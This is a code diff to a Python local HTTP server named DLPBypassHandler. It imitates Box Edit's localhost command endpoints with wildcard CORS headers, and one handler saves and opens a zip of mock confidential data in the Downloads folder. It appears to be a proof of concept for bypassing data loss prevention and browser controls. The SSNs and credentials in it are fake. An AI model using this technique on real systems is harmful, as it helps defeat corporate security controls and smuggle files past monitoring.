@@ -58,6 +58,7 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         """Handle GET requests for file downloads"""
         parsed_path = urlparse(self.path)
+        query_params = parse_qs(parsed_path.query)
         
         if parsed_path.path == '/status':
             self.send_response(200)
@@ -67,8 +68,12 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             response = {"status": "active", "message": "DLP Bypass Server is running"}
             self.wfile.write(json.dumps(response).encode())
             
+        elif parsed_path.path == '/application_command':
+            # Mimic Box Edit's application_command endpoint
+            self.handle_application_command(query_params)
+            
         elif parsed_path.path == '/download_file':
-            # Create a sample file to download
+            # Original download endpoint
             self.create_and_serve_file()
             
         elif parsed_path.path == '/api/document':
@@ -87,9 +92,47 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
+    def handle_application_command(self, query_params):
+        """Handle Box Edit style application command"""
+        try:
+            # Extract parameters like Box Edit does
+            application = query_params.get('application', [''])[0]
+            com_id = query_params.get('com', [''])[0]
+            timeout = query_params.get('timeout', ['4'])[0]
+            timestamp = query_params.get('ms', [''])[0]
+            
+            print(f"[DEBUG] Application command: app={application}, com={com_id}, timeout={timeout}, ms={timestamp}")
+            
+            # Respond like Box Edit would
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+            self.end_headers()
+            
+            # Box Edit style response
+            response = {
+                "response_type": "command",
+                "success": "true",
+                "application": application,
+                "timestamp": timestamp
+            }
+            self.wfile.write(json.dumps(response).encode())
+            print(f"[SECURITY BYPASS] Application command acknowledged")
+            
+        except Exception as e:
+            self.send_error_response(f"Application command error: {str(e)}")
+
     def do_POST(self):
         """Handle POST requests for commands"""
-        if self.path.startswith('/execute_command'):
+        parsed_path = urlparse(self.path)
+        query_params = parse_qs(parsed_path.query)
+        
+        if parsed_path.path == '/application_command':
+            # Handle Box Edit style POST commands
+            self.handle_box_edit_style_command(query_params)
+        elif parsed_path.path.startswith('/execute_command'):
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
             
@@ -99,10 +142,100 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             except json.JSONDecodeError:
                 self.send_error_response("Invalid JSON")
                 return
-                
         else:
             self.send_response(404)
             self.end_headers()
+
+    def handle_box_edit_style_command(self, query_params):
+        """Handle POST commands in Box Edit style"""
+        try:
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            command_data = json.loads(post_data.decode('utf-8'))
+            
+            print(f"[DEBUG] Box Edit style command received: {command_data}")
+            
+            command_type = command_data.get('command_type', 'unknown')
+            
+            if command_type == 'launch_application':
+                # Simulate launching application and downloading file
+                file_id = command_data.get('file_id', 'unknown')
+                auth_token = command_data.get('auth_token', '')
+                
+                print(f"[DEBUG] Launching application for file_id: {file_id}")
+                
+                # Create and save the file locally (like Box Edit would)
+                self.download_file_like_box_edit(file_id, auth_token)
+                
+                # Respond like Box Edit
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.send_header('Access-Control-Allow-Origin', '*')
+                self.end_headers()
+                
+                response = {
+                    "response_type": "command",
+                    "success": "true"
+                }
+                self.wfile.write(json.dumps(response).encode())
+                print(f"[SECURITY BYPASS] File downloaded and saved via Box Edit style command")
+                
+            else:
+                # Handle other command types
+                self.process_command(command_data)
+                
+        except Exception as e:
+            print(f"[DEBUG] Box Edit command error: {str(e)}")
+            self.send_error_response(f"Box Edit command error: {str(e)}")
+
+    def download_file_like_box_edit(self, file_id, auth_token):
+        """Download and save file like Box Edit would"""
+        try:
+            # Create the sensitive file content
+            downloads_path = self.get_downloads_folder()
+            filename = f"confidential_document_{file_id}.zip"
+            file_path = os.path.join(downloads_path, filename)
+            
+            print(f"[DEBUG] Box Edit style download to: {file_path}")
+            
+            # Create zip file with sensitive content
+            with zipfile.ZipFile(file_path, 'w') as zipf:
+                zipf.writestr("CONFIDENTIAL_FINANCIAL_DATA.txt", 
+                    f"FILE ID: {file_id}\n"
+                    f"AUTH TOKEN: {auth_token}\n"
+                    f"DOWNLOADED: {datetime.datetime.now()}\n\n"
+                    "=== CONFIDENTIAL FINANCIAL REPORT ===\n"
+                    "Q4 Revenue: $2.8M\n"
+                    "Employee Salaries:\n"
+                    "- CEO: $450,000\n"
+                    "- CTO: $320,000\n"
+                    "- VP Sales: $280,000\n\n"
+                    "Database Credentials:\n"
+                    "Server: db.company.local\n"
+                    "Username: admin\n"
+                    "Password: SecurePass2024!\n\n"
+                    "This file was downloaded via localhost bypass,\n"
+                    "circumventing browser security controls.")
+                
+                zipf.writestr("EMPLOYEE_SSN_LIST.csv",
+                    "Name,SSN,Department,Salary\n"
+                    "John Smith,123-45-6789,Engineering,$95000\n"
+                    "Sarah Johnson,987-65-4321,Marketing,$78000\n"
+                    "Mike Wilson,555-12-3456,Sales,$85000\n"
+                    "Lisa Brown,444-33-2222,HR,$72000")
+            
+            print(f"[SECURITY BYPASS] Confidential file saved: {file_path}")
+            
+            # Also try to open the file (like Box Edit would)
+            if platform.system() == "Windows":
+                try:
+                    subprocess.Popen(["explorer", file_path])
+                    print(f"[DEBUG] File opened in Windows Explorer")
+                except:
+                    pass
+            
+        except Exception as e:
+            print(f"[DEBUG] Error in Box Edit style download: {str(e)}")
 
     def create_and_serve_file(self):
         """Create and serve a sample file for download"""
